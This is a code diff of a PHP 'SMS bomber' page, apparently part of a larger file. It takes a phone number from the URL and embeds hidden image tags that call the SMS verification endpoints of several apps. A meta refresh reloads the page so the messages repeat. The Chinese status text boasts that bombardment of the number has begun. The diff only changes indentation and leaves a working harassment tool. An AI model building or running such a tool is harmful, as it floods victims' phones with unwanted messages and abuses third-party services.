@@ -1,11 +1,11 @@
 <div class="tip">
-<?php
-error_reporting(0);
-$phone = $_GET['phone'];
+    <?php
+    error_reporting(0);
+    $phone = $_GET['phone'];
 
-if($phone){
-    echo"<br /><div class='progress progress-striped active'><div class='progress-bar progress-bar-success' style='width: 100%;'></div></div><div id='ajax_thread_msg'><div class='alert alert-success'>HULIAPI短信洪渣鸡已启动,  对<strong>$phone</strong>,已经开始轰炸,请静静的等待查看效果！</div></div>";
-    echo "<div style='display:none'>
+    if ($phone) {
+        echo "<br /><div class='progress progress-striped active'><div class='progress-bar progress-bar-success' style='width: 100%;'></div></div><div id='ajax_thread_msg'><div class='alert alert-success'>HULIAPI短信洪渣鸡已启动,  对<strong>$phone</strong>,已经开始轰炸,请静静的等待查看效果！</div></div>";
+        echo "<div style='display:none'>
 <img src='https://app.fangzongguan.com/fangmaster/v4.2/client/quick/user/sendCode?_token=eC1fn3C3WKrzkaIYM2EUYw%3D%3D&amp;phone=$phone&amp;tag=yhoQ9arXKRk3AqpwPGwklOAb/ghFcjxlx0uZNXuiOhXg6sItA%2BuIMWLFLQzyVfRCP1db%2B11CZSVvwzQvNR8xKgpkH2h9VTHRHAPTgHMWw6q5e1SYTdcMB4er6KEEPEDzFU2yJ3N' alt=''/>
 <img src='https://app.hbooker.com/signup/send_verify_code?callback=jQuery111009421744498287961_1580993309090&amp;account=62634757818&amp;app_version=2.3.102&amp;hashvalue=1b817ef4600f743b4517f40764cd4705&amp;device_token=iPhone-3D34A72B-B07D-4260-BF0F-EDBC96F214B9&amp;verify_type=1&amp;phone_num=1-' alt=''/>
 <img src='https://app.leyou.com.cn/system/sendSms?mobile=$phone&amp;sign=fb0a624aade8b0e135196025cbc191c2&amp;transtype=reg_m' alt=''/>
@@ -3303,7 +3303,7 @@ if($phone){
 <img src='http://weihui.yy.com/sendlink.php&env=wap&username=$phone' alt=''/>
 <img src='https://apis.hyguanjia.com/user/send/phone/code?clientid=1254299999&mid=1E0D9617-438F-4A0D-BED0-AEB20FF19A50&phone=$phone&sign=jBvhDrZ6SlcNzwkCx6SIhwkLtCZZ1GCCjvPj%2524%2524QD8balMbMtSRigOLwJkGjU%2540%2540PIsjj1rTgAEWBZDHlnw3%2540%2540Yrg9qGdwvb5Qv4euoCCHNExqXAGhb' alt=''/>
 </div>";
-    echo"<meta http-equiv=refresh content='9999999999; url=index.php?phone=$phone'>";
-}
+        echo "<meta http-equiv=refresh content='9999999999; url=index.php?phone=$phone'>";
+    }
 
-?>
+    ?>
